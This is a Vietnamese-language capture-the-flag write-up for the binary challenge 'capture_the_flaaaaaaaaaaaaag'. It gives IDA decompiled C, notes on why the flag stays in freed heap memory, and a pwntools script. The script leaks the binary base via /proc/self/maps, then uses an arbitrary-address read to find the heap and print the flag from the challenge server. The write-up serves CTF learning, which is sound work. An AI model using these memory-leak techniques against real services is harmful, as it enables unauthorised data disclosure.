# capture_the_flaaaaaaaaaaaaag

1 chall đặc biệt lạ rất đáng làm


## ida 

```c 
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char ptr; // [rsp+Bh] [rbp-15h] BYREF
  unsigned int i; // [rsp+Ch] [rbp-14h]
  FILE *stream; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  stream = fopen("flaaaaaaaaaaaaag", "r");
  if ( !stream )
  {
    puts("cannot fopen the flaaaaaaaaaaaaag");
    exit(1);
  }
  if ( !fread(&ptr, 1uLL, 1uLL, stream) )
  {
    puts("cannot fread the flaaaaaaaaaaaaag");
    exit(1);
  }
  if ( fclose(stream) )
  {
    puts("cannot fclose the flaaaaaaaaaaaaag");
    exit(1);
  }
  printf(
    "At polygl0ts we are very cool, so you get the first flaaaaaaaaaaaaag character for free : %c\n",
    (unsigned int)ptr);
  puts("Figure out the rest yourself !");
  for ( i = 4; (int)i > 0; --i )
  {
    printf("You have %d action(s) left\n", i);
    menu();
  }
  if ( feedback )
    free(feedback);
  puts("no actions left :(");
  exit(0);
}

unsigned __int64 menu()
{
  int v1; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+4h] [rbp-4Ch]
  char *v3[2]; // [rsp+8h] [rbp-48h] BYREF
  FILE *stream; // [rsp+18h] [rbp-38h]
  __int64 buf[2]; // [rsp+20h] [rbp-30h] BYREF
  char s[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("1 - read from file");
  puts("2 - read from memory");
  puts("3 - send feedback");
  printf("> ");
  v1 = 0;
  __isoc99_scanf("%d%*c", &v1);
  switch ( v1 )
  {
    case 1:
      buf[0] = 0LL;
      buf[1] = 0LL;
      printf("filename > ");
      v2 = read(stdin->_fileno, buf, 16uLL);
      if ( v2 <= 0 )
        LOBYTE(buf[0]) = 0;
      else
        *((_BYTE *)buf + v2 - 1) = 0;
      stream = fopen((const char *)buf, "r");
      if ( !stream )
      {
        printf("cannot fopen %s\n", (const char *)buf);
        exit(1);
      }
      if ( !fgets(s, 16, stream) )
      {
        printf("cannot fgets %s\n", (const char *)buf);
        exit(1);
      }
      if ( fclose(stream) )
      {
        printf("cannot fclose %s\n", (const char *)buf);
        exit(1);
      }
      puts(s);
      break;
    case 2:
      v3[0] = 0LL;
      printf("address > ");
      __isoc99_scanf("%zx", v3);
      puts(v3[0]);
      break;
    case 3:
      v3[1] = 0LL;
      if ( feedback )
      {
        puts("sorry, but that's enough criticism for today !");
      }
      else
      {
        puts("please share your thoughts with us");
        printf("> ");
        getline(&feedback, &n, stdin);
        puts("thank you !");
      }
      break;
    default:
      puts("invalid choice");
      exit(1);
  }
  return v7 - __readfsqword(0x28u);
}
```

## Analysis and Exploit

- menu cho ta 3 option, 1 là in nội dung 1 file (cat name_file), 2 là nhập 1 địa chỉ và in data địa chỉ đó, 3 đơn giản là nhập 
- file chứa flag tên flaaaaaaaaaaaaag (16byte), nhưng mà ta nhập tối đa 15byte ở option 1 (1 byte newline), nên ko leak được bằng option 1 
- có 1 đoạn đặc biệt cần để ý 

![image](https://github.com/gookoosss/CTF/assets/128712571/61fd8328-314c-4d2a-bfc7-6013d51308b5)


- ở đây có hàm fread(), đọc flag và lưu vào heap, sau đó hàm fclose sẽ free cái chunk đó, hmm nếu vậy khả năng cao flag được lưu trong top chunk, check xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/de71795e-339c-44e7-89ae-3a9e34c3fdb7)


- oke nếu vậy thì ta chỉ cần leak được heap là xong 
- hmm quan trong là giờ làm sao ta leak được addr bất kì, sau khi được hint thì mình học được 1 lệnh rất hữu ích để leak addr 

```cat /proc/self/maps``` 


![image](https://github.com/gookoosss/CTF/assets/128712571/944b3a10-ad95-43a2-b472-3ed944a17852)


- lệnh này khá giống vs vmmap khi debug, lợi dụng nó để leak exe 

![image](https://github.com/gookoosss/CTF/assets/128712571/e9c3c613-c397-4ac7-8b4a-4344dcf119f3)


- có được exe rồi thì ta chỉ cần leak heap nữa là xong, lúc này ta để ý thằng feedback 


![image](https://github.com/gookoosss/CTF/assets/128712571/d796b7b8-7497-4c30-8909-87cec7f57c51)


- nó được nhập giá trị bằng hàm getline(&feedback), chứng tỏ feedback đang trỏ đến 1 địa chỉ heap, địa chỉ heap chứa data ta nhập vào => leak heap, vô tình ta khởi tạo vùng nhớ heap từ top chunk đang chứa flag, nên ta chỉ nhập 1 byte để ko bị orw flag
- cuối cùng ta cũng có được flag 

![image](https://github.com/gookoosss/CTF/assets/128712571/0d21ca32-43cf-4d27-a923-115d34a29b07)


## script 

```python 
from pwn import *

p = process('./capture_the_flaaaaaaaaaaaaag')
exe = ELF('./capture_the_flaaaaaaaaaaaaag')
p = remote('chall.polygl0ts.ch', 9003)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'us\n', b'3')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'/proc/self/maps')

exe.address = int(p.recvuntil(b'-')[11:-1], 16)
print(hex(exe.address))
feedback = exe.address + 0x4050

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', hex(feedback))
heap = u64(p.recv(6) + b'\0\0')
print(hex(heap)) 

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', hex(heap + 3))

p.interactive()

```
